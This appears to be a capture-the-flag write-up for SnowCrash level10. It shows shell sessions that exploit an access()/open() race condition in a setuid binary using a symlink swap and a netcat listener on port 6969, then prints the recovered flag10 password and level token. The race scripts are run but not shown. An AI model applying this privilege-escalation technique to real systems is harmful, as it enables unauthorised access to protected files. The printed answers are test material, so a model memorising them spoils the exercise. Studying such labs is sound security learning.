How to find:

    level10@SnowCrash:~$ ls -la
    total 28
    dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
    d--x--x--x  1 root    users     340 Aug 30  2015 ..
    -r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
    -r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
    -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
    -r-x------  1 level10 level10   675 Apr  3  2012 .profile
    -rw-------  1 flag10  flag10     26 Mar  5  2016 token

No permissions

    level10@SnowCrash:~$ ./level10
    ./level10 file host
            sends file to host if you have access to it
    
    level10@SnowCrash:~$ ./level10 token
    ./level10 file host
            sends file to host if you have access to it
    
    level10@SnowCrash:~$ cat token
    cat: token: Permission denied
    
    level10@SnowCrash:~$ ./token
    -bash: ./token: Permission denied

open binary with strings

    level10@SnowCrash:~$ strings level10
    [...]
    open
    access
    [...]
    %s file host
            sends file to host if you have access to it
    Connecting to %s:6969 ..
    Unable to connect to host %s
    .*( )*.
    Unable to write banner to host %s
    Connected!
    Sending file ..
    Damn. Unable to open file
    Unable to read from file: %s
    wrote file!
    You don't have access to %s
    [...]

Access checks if we have the rights to read the file then try to send it to a server and shows its content. 
Unfortunately we don't have rights on token


man 2 access

    ...
    NOTES
        Warning:  Using  access()  to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking      
        and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user  ID  to      
        the real ID and then call open(2).)
    ...

Race conditions exploit
There is a delay between access checks permissions and try to open
We create a symbolic link between or file and token and syncronize with the script




try to send a file to host

    level10@SnowCrash:~$ echo "Hola que tal" /tmp/pepe

    level10@SnowCrash:~$ ./level10 /tmp/pepe localhost

    Connecting to localhost:6969 .. Unable to connect to host localhost

open another terminal and listen in port 6969

    level10@SnowCrash:~$ nc -lk 6969


1st terminal, try to connect using VM ip

    level10@SnowCrash:~$ ./level10 /tmp/pepe 10.0.2.15
    Connecting to 10.0.2.15:6969 .. Connected!

2nd terminal

    .*( )*.
    Hola que tal


Now lets crack it:

1st terminal

    level10@SnowCrash:~$ nc -lk 6969 | grep -v ".*( )*."

2nd terminal

    level10@SnowCrash:/$ bash /tmp/raceconditions.sh

3rd terminal

    bash /tmp/runlevel.sh

1st terminal

    woupa2yuojeeaaed06riuj63c


now try user flag10

    level10@SnowCrash:/$ su flag10
    Password: 
    Don't forget to launch getflag !
    flag10@SnowCrash:~$ getflag
    Check flag.Here is your token : feulo4b72j7edeahuete3no7c

